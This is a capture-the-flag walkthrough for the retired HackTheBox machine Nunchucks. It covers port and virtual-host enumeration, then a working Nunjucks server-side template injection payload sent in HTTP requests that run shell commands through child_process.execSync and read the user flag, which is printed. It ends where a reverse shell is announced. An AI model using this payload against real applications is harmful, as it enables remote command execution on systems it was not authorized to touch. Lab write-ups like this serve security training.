# Solution for HackTheBox - Nunchucks - Retired

The nmap results for the box are:
```text
┌──(hanoz㉿kali)-[~/…/htb/challenges/HTBoxes/nunchucks]
└─$ nmap -p- 10.10.11.122                                                                                      130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 16:06 EST
Nmap scan report for 10.10.11.122
Host is up (0.014s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 5.50 seconds
```

It seems we have a http server and an https server so let's see what's what.
```text
┌──(hanoz㉿kali)-[~/…/htb/challenges/HTBoxes/nunchucks]
└─$ nmap -p- 10.10.11.122 -sV -sC
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-03 16:06 EST
Nmap scan report for 10.10.11.122
Host is up (0.015s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
```
We have a domain: nunchucks.htb that we need to add to our etc/hosts

Now when we visit nunchucks.htb, we see all the links in the page are only to the homepage except 
```text
/signup
```
So now we have to register a fake account and sign up

We can't register a fake account and all we are getting is this message
```text
"response":"We're sorry but registration is currently closed."
```
We can't even login to an existing account if we try admin or support because we are getting this message
```text
"response":"We're sorry but user logins are currently disabled."
```

Now let's try to brute for directories
```text
/login
/privacy
/terms
```
There's nothing in here either

Now we will brute force domains
```text
┌──(hanoz㉿kali)-[~]
└─$ gobuster vhost -u https://nunchucks.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://nunchucks.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/01/03 16:34:06 Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.nunchucks.htb (Status: 200) [Size: 4029]
                                                     
===============================================================
2022/01/03 16:34:14 Finished
===============================================================
```

We find aa subdomain.
Here, there is an email sign up form that reflects our input back to us. 
Let's try to do an email validation bypass and try for reflected XSS
Upon a bit of research, we see that the website is vulnerable to SSTI
So we have to use some type of template injection method
Input:
```text
{{3*3}}@whoami.whoami
```
Output:
```text
You will receive updates on the following email address: 9@whoami.whoami
```

Cool now we know that it is vulnerable, we need to find out how we can exploit it
We can bypass the whole Javascript level validation by sending the request through burpsuite
We know from the box name that the backend framework is most likely nunjucks so let's try and see if we can do some sort of command injection
It worked. The payload we used is
```text
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=t636OPcgyQv2Tf8lf35QHSgI
Content-Length: 119
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="92"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://store.nunchucks.htb
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://store.nunchucks.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"email":"{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"ls -la\")')()}}"}
```

Alright now that we know there is command injection let's get the user flag
```text
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=t636OPcgyQv2Tf8lf35QHSgI
Content-Length: 140
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="92"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://store.nunchucks.htb
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://store.nunchucks.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"email":"{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"cd /home/david;cat user.txt\")')()}}"}
```
The flag is 
```text
3be3f93845cf113b6a3cde3ddc2661a7
```

Now let's send ourselves a reverse shell
